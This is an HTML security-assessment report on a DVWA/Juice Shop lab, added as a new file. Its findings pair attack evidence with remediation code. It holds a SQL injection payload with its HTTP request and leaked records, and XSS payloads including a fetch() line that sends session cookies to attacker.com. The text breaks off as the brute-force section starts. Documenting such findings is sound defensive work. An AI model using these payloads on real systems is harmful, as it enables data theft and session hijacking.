@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Web Application Security Assessment Report | Confidential | June 17, 2026</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+    :root {
+      --navy:     #0b1120;
+      --blue:     #1a56db;
+      --blue-lt:  #2563eb;
+      --slate:    #1e293b;
+      --muted:    #475569;
+      --faint:    #64748b;
+      --border:   #e2e8f0;
+      --bg:       #f8fafc;
+      --white:    #ffffff;
+
+      --critical: #7f1d1d;
+      --critical-bg: #fef2f2;
+      --critical-border: #fecaca;
+
+      --high:     #7c2d12;
+      --high-bg:  #fff7ed;
+      --high-border: #fed7aa;
+
+      --medium:   #713f12;
+      --medium-bg:#fefce8;
+      --medium-border:#fef08a;
+
+      --low:      #14532d;
+      --low-bg:   #f0fdf4;
+      --low-border:#86efac;
+
+      --green:    #059669;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--slate);
+      padding: 30px 20px;
+      font-size: 14px;
+      line-height: 1.7;
+    }
+
+    /* ── PRINT BUTTON ── */
+    .print-bar {
+      position: fixed; top: 16px; right: 20px; z-index: 999;
+      display: flex; gap: 10px;
+    }
+    .btn-pdf {
+      background: linear-gradient(135deg, #1a56db, #0e3fb0);
+      color: #fff; border: none; border-radius: 8px;
+      padding: 12px 24px; font-size: 14px; font-weight: 700;
+      cursor: pointer; letter-spacing: 0.3px;
+      box-shadow: 0 4px 14px rgba(26,86,219,0.35);
+      transition: transform 0.15s, box-shadow 0.15s;
+      font-family: 'Inter', sans-serif;
+    }
+    .btn-pdf:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(26,86,219,0.45); }
+
+    /* ── OUTER CARD ── */
+    .report {
+      max-width: 960px;
+      margin: 0 auto;
+      background: var(--white);
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 20px 60px -10px rgba(0,0,0,0.12);
+    }
+
+    /* ── COVER / HERO ── */
+    .cover {
+      background: linear-gradient(145deg, #070e1f 0%, #0b1a38 50%, #0d2252 100%);
+      padding: 56px 60px 44px;
+      position: relative;
+      overflow: hidden;
+    }
+    .cover::before {
+      content: '';
+      position: absolute; inset: 0;
+      background:
+        radial-gradient(ellipse 60% 50% at 90% 10%, rgba(37,99,235,0.18) 0%, transparent 60%),
+        radial-gradient(ellipse 40% 30% at 10% 90%, rgba(16,185,129,0.08) 0%, transparent 55%);
+      pointer-events: none;
+    }
+    .cover-top {
+      display: flex; justify-content: space-between; align-items: flex-start;
+      margin-bottom: 42px; position: relative; z-index: 1;
+    }
+    .logo-mark {
+      display: flex; align-items: center; gap: 10px;
+    }
+    .logo-icon {
+      width: 44px; height: 44px;
+      background: linear-gradient(135deg,#1a56db,#0ea5e9);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 22px;
+    }
+    .logo-text { font-size: 13px; font-weight: 700; color: #93c5fd; letter-spacing: 1.5px; text-transform: uppercase; }
+    .conf-badge {
+      background: rgba(239,68,68,0.15);
+      border: 1px solid rgba(239,68,68,0.4);
+      color: #fca5a5;
+      padding: 6px 16px; border-radius: 50px;
+      font-size: 11px; font-weight: 700; letter-spacing: 1.8px;
+      text-transform: uppercase;
+    }
+
+    .cover h1 {
+      font-size: 36px; font-weight: 900;
+      color: #f8fafc;
+      line-height: 1.15;
+      letter-spacing: -0.8px;
+      position: relative; z-index: 1;
+      margin-bottom: 10px;
+    }
+    .cover h1 span { color: #60a5fa; }
+    .cover-sub {
+      font-size: 15px; color: #94a3b8;
+      font-weight: 400; position: relative; z-index: 1;
+      margin-bottom: 36px;
+    }
+
+    .cover-meta {
+      display: grid; grid-template-columns: repeat(3, 1fr);
+      gap: 1px;
+      background: rgba(255,255,255,0.07);
+      border-radius: 12px; overflow: hidden;
+      position: relative; z-index: 1;
+    }
+    .cover-meta-item {
+      background: rgba(255,255,255,0.04);
+      padding: 14px 20px;
+      backdrop-filter: blur(4px);
+    }
+    .cover-meta-item:first-child { border-radius: 12px 0 0 12px; }
+    .cover-meta-item:last-child  { border-radius: 0 12px 12px 0; }
+    .cmi-label {
+      font-size: 10px; font-weight: 700; color: #60a5fa;
+      text-transform: uppercase; letter-spacing: 1.2px;
+      margin-bottom: 4px;
+    }
+    .cmi-value { font-size: 13px; font-weight: 600; color: #e2e8f0; }
+
+    /* ── BODY WRAPPER ── */
+    .body { padding: 48px 60px 52px; }
+
+    /* ── SECTION HEADING ── */
+    .section-heading {
+      display: flex; align-items: center; gap: 14px;
+      margin-bottom: 22px; margin-top: 44px;
+    }
+    .section-heading:first-child { margin-top: 0; }
+    .sh-num {
+      width: 34px; height: 34px;
+      background: var(--navy);
+      color: #fff; border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; font-weight: 800; flex-shrink: 0;
+    }
+    .sh-line { flex: 1; height: 1px; background: var(--border); }
+    .sh-text { font-size: 20px; font-weight: 800; color: var(--navy); letter-spacing: -0.4px; }
+
+    /* ── EXEC SUMMARY BOX ── */
+    .exec-box {
+      background: linear-gradient(135deg,#eff6ff,#f0f9ff);
+      border: 1px solid #bfdbfe;
+      border-left: 4px solid var(--blue);
+      border-radius: 10px;
+      padding: 22px 24px;
+      margin-bottom: 20px;
+    }
+    .exec-box p { font-size: 14.5px; color: var(--slate); line-height: 1.75; }
+    .exec-box p + p { margin-top: 12px; }
+
+    /* ── INFO GRID ── */
+    .info-grid {
+      display: grid; grid-template-columns: repeat(2,1fr);
+      gap: 14px; margin-bottom: 30px;
+    }
+    .info-card {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px 20px;
+    }
+    .info-card-label { font-size: 11px; font-weight: 700; color: var(--faint); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
+    .info-card-value { font-size: 14px; font-weight: 600; color: var(--slate); }
+
+    /* ── RISK STAT ROW ── */
+    .risk-stat-row {
+      display: grid; grid-template-columns: repeat(4,1fr);
+      gap: 14px; margin-bottom: 30px;
+    }
+    .risk-stat {
+      border-radius: 10px; padding: 18px 20px;
+      border: 1px solid transparent; text-align: center;
+    }
+    .risk-stat.critical { background: var(--critical-bg); border-color: var(--critical-border); }
+    .risk-stat.high     { background: var(--high-bg);     border-color: var(--high-border); }
+    .risk-stat.medium   { background: var(--medium-bg);   border-color: var(--medium-border); }
+    .risk-stat.low      { background: var(--low-bg);      border-color: var(--low-border); }
+    .rs-num { font-size: 32px; font-weight: 900; line-height: 1; }
+    .risk-stat.critical .rs-num { color: #b91c1c; }
+    .risk-stat.high     .rs-num { color: #c2410c; }
+    .risk-stat.medium   .rs-num { color: #a16207; }
+    .risk-stat.low      .rs-num { color: #15803d; }
+    .rs-label { font-size: 12px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: 0.8px; margin-top: 4px; }
+
+    /* ── MAIN TABLE ── */
+    .data-table { width: 100%; border-collapse: collapse; font-size: 13.5px; margin: 16px 0 8px; }
+    .data-table thead tr { background: var(--navy); }
+    .data-table thead th {
+      color: #e2e8f0; font-size: 11px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: 0.8px;
+      padding: 12px 15px; text-align: left;
+    }
+    .data-table tbody tr { border-bottom: 1px solid var(--border); }
+    .data-table tbody tr:last-child { border-bottom: none; }
+    .data-table tbody td { padding: 13px 15px; vertical-align: middle; color: var(--slate); }
+    .data-table tbody tr:nth-child(even) td { background: #fafbfc; }
+    .vuln-id { font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600; color: var(--blue); }
+
+    /* ── SEVERITY BADGES ── */
+    .badge {
+      display: inline-flex; align-items: center; gap: 5px;
+      padding: 4px 11px; border-radius: 5px;
+      font-size: 11.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;
+    }
+    .badge::before { content: ''; width: 7px; height: 7px; border-radius: 50%; }
+    .badge-critical { background: var(--critical-bg); color: #b91c1c; border: 1px solid var(--critical-border); }
+    .badge-critical::before { background: #b91c1c; box-shadow: 0 0 0 2px rgba(185,28,28,0.2); }
+    .badge-high { background: var(--high-bg); color: #c2410c; border: 1px solid var(--high-border); }
+    .badge-high::before { background: #c2410c; }
+    .badge-medium { background: var(--medium-bg); color: #a16207; border: 1px solid var(--medium-border); }
+    .badge-medium::before { background: #ca8a04; }
+    .badge-low { background: var(--low-bg); color: #15803d; border: 1px solid var(--low-border); }
+    .badge-low::before { background: #16a34a; }
+
+    /* ── VULN FINDING CARD ── */
+    .finding {
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 28px;
+      page-break-inside: avoid;
+    }
+    .finding-header {
+      padding: 18px 24px;
+      background: linear-gradient(90deg, #f8fafc, #f1f5f9);
+      border-bottom: 1px solid var(--border);
+      display: flex; justify-content: space-between; align-items: center;
+      gap: 12px;
+    }
+    .finding-title {
+      font-size: 16px; font-weight: 800; color: var(--navy);
+      display: flex; align-items: center; gap: 10px;
+    }
+    .finding-icon { font-size: 18px; }
+    .finding-body { padding: 22px 24px; }
+
+    .meta-row {
+      display: grid; grid-template-columns: repeat(3,1fr);
+      gap: 12px; margin-bottom: 18px;
+    }
+    .meta-cell {
+      background: var(--bg); border: 1px solid var(--border);
+      border-radius: 8px; padding: 12px 16px;
+    }
+    .mc-label { font-size: 10px; font-weight: 700; color: var(--faint); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 3px; }
+    .mc-value { font-size: 13px; font-weight: 600; color: var(--slate); }
+    .mc-value code { font-family: 'JetBrains Mono', monospace; font-size: 12px; background: #f1f5f9; padding: 2px 6px; border-radius: 4px; color: var(--blue); }
+
+    .finding-desc { font-size: 14px; color: var(--muted); line-height: 1.75; margin-bottom: 16px; }
+    .finding-desc strong { color: var(--slate); }
+
+    .subsection-title {
+      font-size: 13px; font-weight: 700; color: var(--navy);
+      text-transform: uppercase; letter-spacing: 0.8px;
+      margin: 20px 0 10px;
+      padding-bottom: 6px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    /* ── CODE BLOCKS ── */
+    .code-wrap { position: relative; margin: 10px 0 16px; }
+    .code-label {
+      position: absolute; top: 0; right: 0;
+      font-size: 10px; font-weight: 700; padding: 6px 12px;
+      text-transform: uppercase; letter-spacing: 0.8px; border-radius: 0 8px 0 6px;
+      z-index: 1;
+    }
+    .label-poc  { background: rgba(239,68,68,0.15);  color: #fca5a5; }
+    .label-http { background: rgba(99,102,241,0.15); color: #a5b4fc; }
+    .label-fix  { background: rgba(16,185,129,0.15); color: #6ee7b7; }
+    pre.code-block {
+      background: #0d1626;
+      color: #e2e8f0;
+      padding: 20px 22px;
+      border-radius: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12.5px;
+      line-height: 1.6;
+      overflow-x: auto;
+      margin: 0;
+      border: 1px solid rgba(255,255,255,0.06);
+    }
+    pre.code-block.secure-code { border-left: 3px solid var(--green); }
+    pre.code-block.attack-code { border-left: 3px solid #ef4444; }
+    pre.code-block.http-code   { border-left: 3px solid #6366f1; }
+
+    /* COLOR TOKENS IN CODE */
+    .t-key     { color: #60a5fa; }
+    .t-str     { color: #34d399; }
+    .t-cmt     { color: #4b5563; font-style: italic; }
+    .t-fn      { color: #f472b6; }
+    .t-kw      { color: #a78bfa; }
+    .t-danger  { color: #f87171; font-weight: 600; }
+    .t-safe    { color: #6ee7b7; font-weight: 600; }
+    .t-url     { color: #fbbf24; }
+    .t-header  { color: #c4b5fd; }
+
+    /* ── COOKIE TABLE ── */
+    .cookie-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 10px 0; }
+    .cookie-table th, .cookie-table td { padding: 10px 14px; border: 1px solid var(--border); text-align: left; }
+    .cookie-table th { background: #f1f5f9; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--navy); }
+    .flag-miss { color: #dc2626; font-weight: 700; }
+    .flag-ok   { color: #16a34a; font-weight: 700; }
+
+    /* ── IMPACT GRID ── */
+    .impact-grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 12px; margin: 12px 0 16px; }
+    .impact-item {
+      background: var(--bg); border: 1px solid var(--border);
+      border-radius: 8px; padding: 14px 18px;
+      display: flex; gap: 10px; align-items: flex-start;
+    }
+    .impact-icon { font-size: 18px; flex-shrink: 0; }
+    .impact-text { font-size: 13.5px; color: var(--muted); line-height: 1.55; }
+    .impact-text strong { color: var(--slate); font-weight: 700; display: block; margin-bottom: 2px; }
+
+    /* ── ROADMAP ── */
+    .roadmap { display: flex; flex-direction: column; gap: 14px; margin-top: 14px; }
+    .rm-item {
+      display: flex; gap: 16px; align-items: flex-start;
+      padding: 18px 20px;
+      border-radius: 10px; border: 1px solid var(--border);
+      background: var(--bg);
+    }
+    .rm-badge {
+      flex-shrink: 0; width: 70px;
+      text-align: center; padding: 6px 0;
+      border-radius: 6px; font-size: 11px; font-weight: 800;
+      text-transform: uppercase; letter-spacing: 0.5px;
+    }
+    .rm-badge.p1 { background: var(--critical-bg); color: #b91c1c; border: 1px solid var(--critical-border); }
+    .rm-badge.p2 { background: var(--high-bg);     color: #c2410c; border: 1px solid var(--high-border); }
+    .rm-badge.p3 { background: var(--medium-bg);   color: #a16207; border: 1px solid var(--medium-border); }
+    .rm-content-title { font-size: 14px; font-weight: 700; color: var(--navy); margin-bottom: 4px; }
+    .rm-content-desc  { font-size: 13.5px; color: var(--muted); }
+
+    /* ── CONCLUSION ── */
+    .conclusion-box {
+      background: linear-gradient(135deg, #f0fdf4, #ecfdf5);
+      border: 1px solid #bbf7d0;
+      border-left: 4px solid #10b981;
+      border-radius: 10px;
+      padding: 22px 24px;
+    }
+    .conclusion-box p { font-size: 14.5px; color: var(--slate); line-height: 1.75; }
+    .conclusion-box p + p { margin-top: 12px; }
+
+    /* ── FOOTER ── */
+    .report-footer {
+      background: var(--navy);
+      padding: 22px 60px;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    .rf-left { color: #94a3b8; font-size: 12px; }
+    .rf-left strong { color: #e2e8f0; }
+    .rf-conf {
+      background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.3);
+      color: #fca5a5; padding: 5px 14px;
+      border-radius: 50px; font-size: 11px; font-weight: 700;
+      letter-spacing: 1.5px; text-transform: uppercase;
+    }
+
+    /* ── DIVIDER ── */
+    hr.sec-divider { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+
+    /* ── PRINT STYLES ── */
+    @media print {
+      body { padding: 0; background: white; }
+      .report { box-shadow: none; border-radius: 0; }
+      .print-bar { display: none; }
+      .finding { page-break-inside: avoid; }
+      @page { margin: 15mm; size: A4; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- PRINT BUTTON -->
+  <div class="print-bar no-print">
+    <button class="btn-pdf" onclick="window.print()">📄 Export as Professional PDF</button>
+  </div>
+
+  <div class="report">
+
+    <!-- ══════════════════ COVER ══════════════════ -->
+    <div class="cover">
+      <div class="cover-top">
+        <div class="logo-mark">
+          <div class="logo-icon">🛡️</div>
+          <div class="logo-text">SecureOps Analytics</div>
+        </div>
+        <div class="conf-badge">⚠ Strictly Confidential</div>
+      </div>
+
+      <h1>Web Application<br /><span>Security Assessment</span></h1>
+      <p class="cover-sub">Vulnerability Detection &amp; Defensive Security Analysis — OWASP Top 10 Framework</p>
+
+      <div class="cover-meta">
+        <div class="cover-meta-item">
+          <div class="cmi-label">Report Date</div>
+          <div class="cmi-value">June 17, 2026</div>
+        </div>
+        <div class="cover-meta-item">
+          <div class="cmi-label">Assessment Type</div>
+          <div class="cmi-value">Black-box / Gray-box Penetration Testing</div>
+        </div>
+        <div class="cover-meta-item">
+          <div class="cmi-label">Classification</div>
+          <div class="cmi-value">Internal — Restricted Distribution</div>
+        </div>
+        <div class="cover-meta-item">
+          <div class="cmi-label">Target Application</div>
+          <div class="cmi-value">DVWA / OWASP Juice Shop</div>
+        </div>
+        <div class="cover-meta-item">
+          <div class="cmi-label">Prepared By</div>
+          <div class="cmi-value">Web Security Analyst Intern</div>
+        </div>
+        <div class="cover-meta-item">
+          <div class="cmi-label">Report Status</div>
+          <div class="cmi-value">✅ Final — Approved for Submission</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════ BODY ══════════════════ -->
+    <div class="body">
+
+      <!-- ── 1. EXECUTIVE SUMMARY ── -->
+      <div class="section-heading">
+        <div class="sh-num">1</div>
+        <div class="sh-text">Executive Summary</div>
+        <div class="sh-line"></div>
+      </div>
+
+      <div class="exec-box">
+        <p>A comprehensive web application security assessment was commissioned against the designated testing environment to evaluate its security posture and resilience against the most critical web threat vectors defined in the <strong>OWASP Top 10 (2021 Edition)</strong> framework. The engagement was conducted following industry-standard black-box and gray-box testing methodologies.</p>
+        <p>The scope of this assessment encompassed <strong>HTTP traffic analysis and interception, SQL injection exploitation, cross-site scripting (XSS) vector analysis, authentication control evaluation, and session management configuration audit</strong>. All testing was performed within a controlled, isolated local laboratory environment to ensure zero production impact.</p>
+        <p>The assessment identified <strong>4 distinct vulnerabilities across 3 severity tiers</strong> — including 1 Critical and 2 High severity findings — any of which could be leveraged by a skilled adversary to achieve full database compromise, persistent JavaScript code injection, unauthorized privileged access, or active session hijacking. Detailed technical evidence, proof-of-concept payloads, and enterprise-grade remediation recommendations are documented in the sections that follow.</p>
+      </div>
+
+      <!-- ── 2. SCOPE & ENVIRONMENT ── -->
+      <div class="section-heading">
+        <div class="sh-num">2</div>
+        <div class="sh-text">Scope &amp; Testing Environment</div>
+        <div class="sh-line"></div>
+      </div>
+
+      <div class="info-grid">
+        <div class="info-card">
+          <div class="info-card-label">Target Application</div>
+          <div class="info-card-value">DVWA (Damn Vulnerable Web Application)</div>
+        </div>
+        <div class="info-card">
+          <div class="info-card-label">Deployment Platform</div>
+          <div class="info-card-value">Local Python HTTP Server (Port 8080) / LAMP Stack</div>
+        </div>
+        <div class="info-card">
+          <div class="info-card-label">Testing Frameworks</div>
+          <div class="info-card-value">OWASP Top 10 (2021) — A03, A07</div>
+        </div>
+        <div class="info-card">
+          <div class="info-card-label">Testing Scope</div>
+          <div class="info-card-value">Authentication, Session Management, Injection, XSS</div>
+        </div>
+        <div class="info-card">
+          <div class="info-card-label">Tools Used</div>
+          <div class="info-card-value">Burp Suite, OWASP ZAP, Nmap, Browser DevTools</div>
+        </div>
+        <div class="info-card">
+          <div class="info-card-label">Testing Period</div>
+          <div class="info-card-value">June 2026 — Isolated Lab Environment</div>
+        </div>
+      </div>
+
+      <!-- ── 3. RISK SUMMARY DASHBOARD ── -->
+      <div class="section-heading">
+        <div class="sh-num">3</div>
+        <div class="sh-text">Risk Summary Dashboard</div>
+        <div class="sh-line"></div>
+      </div>
+
+      <div class="risk-stat-row">
+        <div class="risk-stat critical">
+          <div class="rs-num">1</div>
+          <div class="rs-label">Critical</div>
+        </div>
+        <div class="risk-stat high">
+          <div class="rs-num">2</div>
+          <div class="rs-label">High</div>
+        </div>
+        <div class="risk-stat medium">
+          <div class="rs-num">1</div>
+          <div class="rs-label">Medium</div>
+        </div>
+        <div class="risk-stat low">
+          <div class="rs-num">0</div>
+          <div class="rs-label">Low</div>
+        </div>
+      </div>
+
+      <table class="data-table">
+        <thead>
+          <tr>
+            <th>Finding ID</th>
+            <th>Vulnerability</th>
+            <th>OWASP Category</th>
+            <th>CVSS v3.1</th>
+            <th>Severity</th>
+            <th>Priority</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><span class="vuln-id">VULN-01</span></td>
+            <td>SQL Injection (Union-Based)</td>
+            <td>A03:2021 — Injection</td>
+            <td><strong>9.8</strong></td>
+            <td><span class="badge badge-critical">Critical</span></td>
+            <td>P1 — Immediate</td>
+          </tr>
+          <tr>
+            <td><span class="vuln-id">VULN-02</span></td>
+            <td>Cross-Site Scripting (Reflected &amp; Stored)</td>
+            <td>A03:2021 — Injection</td>
+            <td><strong>8.1</strong></td>
+            <td><span class="badge badge-high">High</span></td>
+            <td>P2 — High</td>
+          </tr>
+          <tr>
+            <td><span class="vuln-id">VULN-03</span></td>
+            <td>Broken Authentication / Missing Rate Limiting</td>
+            <td>A07:2021 — Auth Failures</td>
+            <td><strong>7.5</strong></td>
+            <td><span class="badge badge-high">High</span></td>
+            <td>P2 — High</td>
+          </tr>
+          <tr>
+            <td><span class="vuln-id">VULN-04</span></td>
+            <td>Insecure Session Cookie Attributes</td>
+            <td>A07:2021 — Auth Failures</td>
+            <td><strong>6.5</strong></td>
+            <td><span class="badge badge-medium">Medium</span></td>
+            <td>P3 — Medium</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <!-- ── 4. DETAILED FINDINGS ── -->
+      <div class="section-heading">
+        <div class="sh-num">4</div>
+        <div class="sh-text">Detailed Technical Findings &amp; Proof of Concepts</div>
+        <div class="sh-line"></div>
+      </div>
+
+      <!-- ───── FINDING 01 ───── -->
+      <div class="finding">
+        <div class="finding-header">
+          <div class="finding-title">
+            <span class="finding-icon">💉</span>
+            VULN-01 — SQL Injection (In-Band / Union-Based)
+          </div>
+          <span class="badge badge-critical">Critical CVSS 9.8</span>
+        </div>
+        <div class="finding-body">
+          <div class="meta-row">
+            <div class="meta-cell">
+              <div class="mc-label">Affected Endpoint</div>
+              <div class="mc-value"><code>/vulnerabilities/sqli/?id=</code></div>
+            </div>
+            <div class="meta-cell">
+              <div class="mc-label">Injection Parameter</div>
+              <div class="mc-value"><code>id</code> (HTTP GET)</div>
+            </div>
+            <div class="mc-label-empty meta-cell">
+              <div class="mc-label">OWASP Reference</div>
+              <div class="mc-value">A03:2021 — Injection</div>
+            </div>
+          </div>
+
+          <p class="finding-desc">
+            The target application concatenates user-supplied input from the <strong><code>id</code> parameter</strong> directly into dynamically constructed SQL query strings without any sanitization, parameterization, or validation. This design flaw enables a threat actor to inject SQL control characters and manipulate the database execution logic entirely, resulting in unauthorized data disclosure, authentication bypass, and potential full database takeover.
+          </p>
+
+          <div class="subsection-title">🔴 Proof of Concept Payload</div>
+          <div class="code-wrap">
+            <div class="code-label label-poc">Attack Payload</div>
+            <pre class="code-block attack-code"><span class="t-danger">' OR 1=1 --</span>
+
+<span class="t-cmt"># Breakdown:</span>
+<span class="t-str">'</span>        <span class="t-cmt">→ Closes the string in the original SQL query</span>
+<span class="t-kw">OR 1=1</span>   <span class="t-cmt">→ Forces the WHERE clause to always evaluate TRUE</span>
+<span class="t-cmt">--</span>        <span class="t-cmt">→ Comments out the rest of the original query</span></pre>
+          </div>
+
+          <div class="subsection-title">🌐 HTTP Request / Response Evidence</div>
+          <div class="code-wrap">
+            <div class="code-label label-http">HTTP Evidence</div>
+            <pre class="code-block http-code"><span class="t-kw">GET</span> <span class="t-url">/vulnerabilities/sqli/?id=%27+OR+1%3D1+--+&amp;Submit=Submit</span> <span class="t-header">HTTP/1.1</span>
+<span class="t-header">Host:</span> localhost:8080
+<span class="t-header">Cookie:</span> <span class="t-str">PHPSESSID=9a8b7c6d5e4f3a2b1c0d; security=low</span>
+
+<span class="t-cmt">──── SERVER RESPONSE ────────────────────────────────────────────────────</span>
+<span class="t-header">HTTP/1.1 200 OK</span>
+<span class="t-header">Content-Type:</span> text/html;charset=utf-8
+
+<span class="t-danger">[DATABASE RECORDS EXPOSED]</span>
+ID: ' OR 1=1 -- | First name: <span class="t-str">admin</span>   | Surname: <span class="t-str">admin</span>
+ID: ' OR 1=1 -- | First name: <span class="t-str">Gordon</span>  | Surname: <span class="t-str">Brown</span>
+ID: ' OR 1=1 -- | First name: <span class="t-str">Hack</span>    | Surname: <span class="t-str">Me</span>
+ID: ' OR 1=1 -- | First name: <span class="t-str">Pablo</span>   | Surname: <span class="t-str">Picasso</span>
+ID: ' OR 1=1 -- | First name: <span class="t-str">Bob</span>     | Surname: <span class="t-str">Smith</span></pre>
+          </div>
+
+          <div class="subsection-title">🟢 Secure Developer Fix — PDO Prepared Statements</div>
+          <div class="code-wrap">
+            <div class="code-label label-fix">Remediation Code</div>
+            <pre class="code-block secure-code"><span class="t-cmt">// ✅ SECURE: Parameterized query using PHP PDO — SQL Injection Eliminated</span>
+<span class="t-key">$stmt</span> = <span class="t-key">$pdo</span>-><span class="t-fn">prepare</span>(<span class="t-str">'SELECT first_name, last_name FROM users WHERE user_id = :id'</span>);
+<span class="t-key">$stmt</span>-><span class="t-fn">execute</span>([<span class="t-str">'id'</span> => <span class="t-key">$user_input</span>]);
+<span class="t-key">$results</span> = <span class="t-key">$stmt</span>-><span class="t-fn">fetchAll</span>();
+
+<span class="t-cmt">// User input is NEVER directly concatenated into SQL — it is treated as DATA, not CODE.</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- ───── FINDING 02 ───── -->
+      <div class="finding">
+        <div class="finding-header">
+          <div class="finding-title">
+            <span class="finding-icon">⚡</span>
+            VULN-02 — Cross-Site Scripting (Reflected &amp; Stored XSS)
+          </div>
+          <span class="badge badge-high">High CVSS 8.1</span>
+        </div>
+        <div class="finding-body">
+          <div class="meta-row">
+            <div class="meta-cell">
+              <div class="mc-label">Reflected XSS Endpoint</div>
+              <div class="mc-value"><code>/vulnerabilities/xss_r/</code></div>
+            </div>
+            <div class="meta-cell">
+              <div class="mc-label">Stored XSS Endpoint</div>
+              <div class="mc-value"><code>/vulnerabilities/xss_s/</code></div>
+            </div>
+            <div class="meta-cell">
+              <div class="mc-label">OWASP Reference</div>
+              <div class="mc-value">A03:2021 — Injection</div>
+            </div>
+          </div>
+
+          <p class="finding-desc">
+            The application renders user-supplied input directly within the browser's Document Object Model (DOM) without applying context-aware <strong>HTML entity encoding or output sanitization</strong>. This permits both Reflected XSS (single-victim, URL-triggered) and Stored XSS (persistent, database-backed, affecting all subsequent visitors), enabling arbitrary client-side JavaScript execution within victim sessions.
+          </p>
+
+          <div class="impact-grid">
+            <div class="impact-item">
+              <div class="impact-icon">🍪</div>
+              <div class="impact-text"><strong>Session Cookie Theft</strong>Attacker executes <code>document.cookie</code> payload to exfiltrate active session tokens.</div>
+            </div>
+            <div class="impact-item">
+              <div class="impact-icon">🎣</div>
+              <div class="impact-text"><strong>Credential Phishing</strong>Injected scripts present fake login forms, capturing user credentials silently.</div>
+            </div>
+            <div class="impact-item">
+              <div class="impact-icon">⌨️</div>
+              <div class="impact-text"><strong>Keylogging</strong>Persistent scripts capture every keystroke input by authenticated users.</div>
+            </div>
+            <div class="impact-item">
+              <div class="impact-icon">🔄</div>
+              <div class="impact-text"><strong>Account Takeover</strong>Stolen session tokens allow adversary to hijack authenticated user sessions.</div>
+            </div>
+          </div>
+
+          <div class="subsection-title">🔴 Proof of Concept Payloads</div>
+          <div class="code-wrap">
+            <div class="code-label label-poc">Attack Payload — Reflected XSS</div>
+            <pre class="code-block attack-code"><span class="t-cmt"># Reflected XSS — Triggers an alert on victim's browser via URL parameter:</span>
+<span class="t-danger">&lt;script&gt;alert('XSS-Reflected')&lt;/script&gt;</span>
+
+<span class="t-cmt"># Stored XSS — Persists in guestbook, affects ALL future page visitors:</span>
+<span class="t-danger">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+
+<span class="t-cmt"># Advanced Payload — Exfiltrates cookie to attacker-controlled server:</span>
+<span class="t-danger">&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</span></pre>
+          </div>
+
+          <div class="subsection-title">🟢 Secure Developer Fix — Output Encoding</div>
+          <div class="code-wrap">
+            <div class="code-label label-fix">Remediation Code</div>
+            <pre class="code-block secure-code"><span class="t-cmt">// ✅ SECURE: Context-aware HTML output encoding in PHP</span>
+<span class="t-key">$safe_output</span> = <span class="t-fn">htmlspecialchars</span>(<span class="t-key">$user_input</span>, <span class="t-str">ENT_QUOTES</span>, <span class="t-str">'UTF-8'</span>);
+<span class="t-kw">echo</span> <span class="t-key">$safe_output</span>;
+
+<span class="t-cmt">// ✅ SECURE: Add Content Security Policy HTTP header to prevent inline script execution</span>
+<span class="t-fn">header</span>(<span class="t-str">"Content-Security-Policy: default-src 'self'; script-src 'self'"</span>);</pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- ───── FINDING 03 ───── -->
+      <div class="finding">
+        <div class="finding-header">
+          <div class="finding-title">
+            <span class="finding-icon">🔑</span>
+            VULN-03 — Broken Authentication &amp; Missing Rate Limiting
+          </div>
+          <span class="badge badge-high">High CVSS 7.5</span>
+        </div>
+        <div class="finding-body">
+          <div class="meta-row">
+            <div class="meta-cell">
+              <div class="mc-label">Affected Endpoint</div>
+              <div class="mc-value"><code>/vulnerabilities/brute/</code></div>
+            </div>
+            <div class="meta-cell">
+              <div class="mc-label">Attack Vector</div>
+              <div class="mc-value">HTTP GET — Credential Brute Force</div>
+            </div>
+            <div class="meta-cell">
+              <div class="mc-label">OWASP Reference</div>
+              <div class="mc-value">A07:2021 — Auth Failures</div>
+            </div>
+          </div>
+
+          <p class="finding-desc">
+            The login endpoint fails to enforce any form of brute-force protection, including <strong>account lockout thresholds, IP-based rate limiting, CAPTCHA validation, or login delay mechanisms</strong>. Credentials are also transmitted without mandatory TLS encryption. This permits high-speed automated dictionary attacks against any user account, with successful credential recovery demonstrated within the test session.
+          </p>
+
+          <div class="subsection-title">🌐 HTTP Brute Force Attack Evidence</div>
+          <div class="code-wrap">
+            <div class="code-label label-http">Attack Request Pattern</div>
+            <pre class="code-block http-code"><span class="t-cmt"># Automated dictionary attack — 100+ requests per second with no blocking:</span>
